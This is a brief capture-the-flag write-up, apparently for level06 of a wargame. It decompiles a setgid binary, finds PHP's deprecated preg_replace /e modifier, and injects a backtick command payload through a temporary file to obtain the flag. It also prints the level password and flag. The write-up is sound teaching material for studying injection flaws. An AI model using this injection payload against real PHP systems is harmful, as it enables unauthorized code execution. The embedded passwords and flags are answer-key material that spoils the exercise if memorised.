# level06

## Vulnerability: Deprecated function leading to code injection

level06's password: `viuaaale9huek52boumoomioc`

1. examinate existing files and permissions

```bash
ls -la
```

shows that the level06 executable belongs to flag06 group, privilege escalation should be possible

2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code

```bash
scp -P 4242 level06@<host>:level06 .
retdecomp level06
```

setresgid() confirms that privilege escalation is possible

4. examinate the existing php code

```bash
cat level06.php
```

shows deprecated `\e` regex modifier, which indicates we can inject code in the string. preg_replace will perform the regex substitution then evaluate the code

5. inject some code to pwn the flag

```bash
echo '[x ${`getflag`}]' > /tmp/exploit.php
```

```bash
./level06 /tmp/exploit.php
```

gives flag: `wiok45aaoguiboiki2tuin6ub`
